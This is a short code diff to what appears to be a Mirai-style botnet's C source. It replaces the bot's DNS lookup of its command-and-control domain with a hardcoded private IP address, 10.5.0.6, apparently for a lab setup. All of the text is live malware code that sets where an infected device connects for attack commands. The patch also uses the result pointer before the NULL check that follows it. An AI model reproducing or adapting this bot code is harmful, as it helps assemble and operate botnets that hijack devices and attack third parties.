@@ -360,8 +360,21 @@ static void resolve_cnc_addr(void)
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    // entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    entries = calloc(1, sizeof (struct resolv_entries));
+
     table_lock_val(TABLE_CNC_DOMAIN);
+    entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
+    uint32_t *p;
+    uint8_t tmp_buf[4];
+    // 10.5.0.6
+    //00001010.00000101.00000000.00000110
+    tmp_buf[0] = 10;
+    tmp_buf[1] = 5;
+    tmp_buf[2] = 0;
+    tmp_buf[3] = 6;
+    p = (uint32_t *)tmp_buf;
+    entries->addrs[entries->addrs_len++] = (*p);
     if (entries == NULL)
     {
 #ifdef DEBUG
